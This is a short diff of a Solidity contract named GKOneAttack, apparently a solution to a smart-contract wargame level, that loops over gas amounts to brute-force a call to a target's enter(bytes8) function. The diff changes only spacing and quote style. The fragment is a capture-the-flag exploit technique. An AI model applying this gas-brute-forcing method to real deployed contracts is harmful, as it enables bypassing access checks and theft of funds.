@@ -36,8 +36,8 @@ contract GKOneAttack {
 
 		for (uint256 i = 0; i < 120; i++) {
 			// Using call (vs. an abstract interface) prevents reverts from propagating.
-			(bool result, ) = GKOneAddr.call{gas: i + 150 + 8191 * 3}(
-				abi.encodeWithSignature('enter(bytes8)', key)
+			(bool result, ) = GKOneAddr.call{ gas: i + 150 + 8191 * 3 }(
+				abi.encodeWithSignature("enter(bytes8)", key)
 			);
 
 			if (result) {
